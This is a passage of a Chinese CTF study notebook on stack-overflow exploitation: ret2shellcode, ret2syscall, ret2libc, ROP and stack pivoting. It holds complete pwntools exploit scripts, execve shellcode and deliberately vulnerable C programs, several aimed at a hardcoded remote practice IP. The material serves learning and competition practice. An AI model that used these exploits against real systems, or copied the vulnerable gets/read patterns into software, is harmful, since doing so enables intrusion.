<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png" alt=""></p>
<p>payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
<span style="color:#75715e"># sh = process(./ret2shellcode)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10002</span>)
<span style="color:#75715e">## 获得system(&#34;bin/sh&#34;)的asm</span>
shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
buf2_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>
<span style="color:#75715e"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
sh<span style="color:#f92672">.</span>sendline(shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">112</span>,<span style="color:#e6db74">&#34;A&#34;</span>)<span style="color:#f92672">+</span>p32(buf2_addr))
sh<span style="color:#f92672">.</span>interactive()
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png" alt=""></p>
<p>练习题：sniperoj-pwn100-shellcode-x86-64</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407140954.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407144021.png" alt=""></p>
<p>偏移：<code> var void *buf @ rbp-0x10</code>   shellcode可用空间：16+8=24</p>
<p>找shellcode  <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
<p><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">    <span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
    <span style="color:#75715e"># char *const argv[]
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xorl</span> %esi, %esi

    <span style="color:#75715e"># &#39;h&#39; &#39;s&#39; &#39;/&#39; &#39;/&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;/&#39;
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">movq</span> <span style="color:#66d9ef">$0x68732f2f6e69622f</span>, %rbx

    <span style="color:#75715e"># for &#39;\x00&#39;
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pushq</span> %rsi

    <span style="color:#a6e22e">pushq</span> %rbx

    <span style="color:#a6e22e">pushq</span> %rsp
    <span style="color:#75715e"># const char *filename
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">popq</span> %rdi

    <span style="color:#75715e"># __NR_execve 59
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pushq</span> <span style="color:#66d9ef">$59</span>
    <span style="color:#a6e22e">popq</span> %rax

    <span style="color:#75715e"># char *const envp[]
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xorl</span> %edx, %edx

    <span style="color:#a6e22e">syscall</span>
 <span style="color:#960050;background-color:#1e0010">*/</span>

<span style="color:#960050;background-color:#1e0010">/*</span>
  <span style="color:#a6e22e">gcc</span> -<span style="color:#66d9ef">z</span> <span style="color:#66d9ef">execstack</span> <span style="color:#66d9ef">push64.c</span>

  <span style="color:#a6e22e">uname</span> -<span style="color:#66d9ef">r</span>
  <span style="color:#960050;background-color:#1e0010">3</span><span style="color:#a6e22e">.19.3-3-ARCH</span>
 <span style="color:#960050;background-color:#1e0010">*/</span>
 <span style="color:#a6e22e">shellcode</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xf6</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x48</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xbb</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x62</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x69</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6e</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x68</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x56</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
    <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#a6e22e">x53</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x54</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x5f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6a</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x3b</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x58</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xd2</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x0f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x05</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#75715e">;
</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shellcode&#39;</span>)
<span style="color:#75715e"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
shellcode <span style="color:#f92672">=</span>     <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><span style="color:#e6db74">&#34;</span>
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;[&#39;</span>)
buf_addr <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;]&#39;</span>,drop<span style="color:#f92672">=</span>True)
buf_addr <span style="color:#f92672">=</span> int(buf_addr,<span style="color:#ae81ff">16</span>)
<span style="color:#75715e"># print(buf_addr)</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(buf_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> shellcode
<span style="color:#75715e"># 32是24字节的填充数据长度加返回地址长度24+8</span>
<span style="color:#66d9ef">print</span> payload
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><h6 id="ret2syscall">ret2syscall</h6>
<p>控制程序执行系统调用</p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407152204.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407152706.png" alt=""></p>
<p>相对ebp的偏移为0x64=108  覆盖范围为+4=112</p>
<p>没法ret2text,也没法ret2shellcode</p>
<p>只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用</p>
<pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)
</code></pre><p>使用ROPgadget寻找gadgets</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407155958.png" alt=""></p>
<p>这样就能够控制到eax,ebx,ecx,edx寄存器。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png" alt=""></p>
<p>写payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
<span style="color:#75715e"># io = process(./ret2syscall)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10004</span>)

pop_eax_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080bb196</span>
pop_ebcdx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806eb90</span>
int_0x80_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049421</span>
bin_sh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080BE408</span>
payload <span style="color:#f92672">=</span> flat(
    [<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,pop_eax_addr,<span style="color:#ae81ff">0xb</span>,pop_ebcdx_addr,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,bin_sh_addr,int_0x80_addr]
)
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()

</code></pre></div><h6 id="ret2libc">ret2libc</h6>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&rdquo;)，故而此时我们需要知道 system 函数的地址。</p>
<p>eg1:  <a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175007.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [esp+1Ch] [ebp-64h]
</span><span style="color:#75715e"></span>
  setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  setvbuf(_bss_start, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
  puts(<span style="color:#e6db74">&#34;RET2LIBC &gt;_&lt;&#34;</span>);
  gets(<span style="color:#f92672">&amp;</span>s);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175502.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175715.png" alt=""></p>
<p>exp1:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># io = process(&#39;./ret2libc1&#39;)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10006</span>)
binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048720</span>
sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>

payload <span style="color:#f92672">=</span> flat([<span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span>,sym_plt_addr,<span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>,binsh_addr])
<span style="color:#75715e"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>

io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><hr>
<p>eg2:</p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
<p>缺少/bin/sh 只能自己寻找gadgets来进行构造。</p>
<p>exp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># io = process(&#39;./ret2libc2&#39;)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10007</span>)
<span style="color:#75715e"># binsh_addr = 0x08048720</span>
sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048490</span>
sym_imp_gets_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>
pop_ebx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804872f</span>
buf2_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>

payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>,buf2_addr])
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>eg3:</p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
<p>2的基础上去掉了system的地址。</p>
<p>got 表泄露libc的函数地址</p>
<p>利用思路：</p>
<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>
<p>exp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher

context(log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>,arch <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>,os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span> )
<span style="color:#75715e"># io = process(&#39;./ret2libc3&#39;)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10008</span>)
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc3&#39;</span>)
puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
start_main_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]

payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,puts_plt,main,start_main_got])
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Can you find it !?&#34;</span>,payload)

libc_start_main_addr <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv()[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>])
libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>,libc_start_main_addr)
libcbase <span style="color:#f92672">=</span> libc_start_main_addr<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>)
sym_addr <span style="color:#f92672">=</span> libcbase<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;system&#39;</span>)
binsh_addr <span style="color:#f92672">=</span> libcbase<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;str_bin_sh&#39;</span>)

payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,sym_addr,<span style="color:#e6db74">&#34;bbbb&#34;</span>,binsh_addr])
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><h5 id="中级rop">中级ROP</h5>
<h6 id="ret2csu">ret2csu</h6>
<p>利用 x64 下的 __libc_csu_init 中的 gadgets.</p>
<p>eg:level5:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#undef _FORTIFY_SOURCE
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable_function</span>() {
	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
	read(STDIN_FILENO, buf, <span style="color:#ae81ff">512</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv) {
	write(STDOUT_FILENO, <span style="color:#e6db74">&#34;Hello, World</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">13</span>);
	vulnerable_function();
}
</code></pre></div><p>exp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
</code></pre></div><h6 id="ret2reg">ret2reg</h6>
<ul>
<li>略 无题目</li>
</ul>
<h6 id="brop">BROP</h6>
<ul>
<li>略 无二进制</li>
</ul>
<h5 id="高级rop">高级ROP</h5>
<h6 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve</h6>
<p>XDCTF2015-pwn200</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
{
    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
    setbuf(stdin, buf);
    read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">256</span>);
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome to XDCTF2015~!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;

    setbuf(stdout, buf);
    write(<span style="color:#ae81ff">1</span>, buf, strlen(buf));
    vuln();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
<span style="color:#75715e">//gcc -o bof -m32 -fno-stack-protector bof.c
</span></code></pre></div><h6 id="srop">SROP</h6>
<h6 id="ret2vdso">ret2VDSO</h6>
<h5 id="花式栈溢出">花式栈溢出</h5>
<ul>
<li>stack pivoting</li>
</ul>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w">X-CTF Quals 2016 - b0verfl0w</a></p>
<p>转移堆：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200">EkoPartyCTF 2016 fuckzing-exploit-200</a></p>
<ul>
<li>frame faking</li>
</ul>
<p>2018 安恒杯 over</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190522130814.png" alt=""></p>
<p>直接EXP 分析，，困扰了很久的exp</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./over.over&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>(cmd):
    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
    gdb<span style="color:#f92672">.</span>attach(io, cmd)

io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./over.over&#34;</span>)
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./over.over&#34;</span>)
libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc

io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span>)
stack <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x70</span>
success(<span style="color:#e6db74">&#34;stack -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(stack))


<span style="color:#75715e">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, flat([<span style="color:#e6db74">&#39;11111111&#39;</span>, <span style="color:#ae81ff">0x400793</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>], elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>], <span style="color:#ae81ff">0x400676</span>, (<span style="color:#ae81ff">80</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">40</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;1&#39;</span>, stack, <span style="color:#ae81ff">0x4006be</span>]))
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))

pop_rdi_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400793</span>
<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34;
</span><span style="color:#e6db74">0x00000000000f5279 : pop rdx ; pop rsi ; ret
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdx_pop_rsi_ret<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf5279</span>


payload<span style="color:#f92672">=</span>flat([<span style="color:#e6db74">&#39;22222222&#39;</span>, pop_rdi_ret, next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)),pop_rdx_pop_rsi_ret,p64(<span style="color:#ae81ff">0</span>),p64(<span style="color:#ae81ff">0</span>), libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;execve&#39;</span>], (<span style="color:#ae81ff">80</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> ) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;2&#39;</span>, stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x4006be</span>])

io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, payload)

io<span style="color:#f92672">.</span>interactive()

</code></pre></div><ul>
<li>Stack smash</li>
</ul>
<p>35c3 CTF readme</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190522132544.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

addr_ow_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600d20</span>
addr_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400d20</span>

H,P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">6666</span>

<span style="color:#75715e">#r = process(&#39;./readme.bin&#39;)</span>
r <span style="color:#f92672">=</span> remote(H,P)
junk  <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;What&#39;s your name? &#34;</span>)
exploit  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x218</span>
exploit <span style="color:#f92672">+=</span> p64(addr_flag)
exploit <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
exploit <span style="color:#f92672">+=</span> p64(addr_ow_flag)
r<span style="color:#f92672">.</span>sendline(exploit)
junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Please overwrite the flag: &#34;</span>)
exploit  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LIBC_FATAL_STDERR_=1&#34;</span>
r<span style="color:#f92672">.</span>sendline(exploit)
junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>recvall()
<span style="color:#66d9ef">print</span> junk

</code></pre></div><ul>
<li>栈上partial overwrite</li>
</ul>
<p>2018 安恒杯 babypie</p>
<p>2018 XNUCA-gets</p>
<h5 id="canary-绕过技术">Canary 绕过技术</h5>
<ul>
<li>
<p>泄露栈中的Canary</p>
<p>覆盖 Canary 的低字节，来打印出剩余的 Canary 部分</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// ex2.c
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
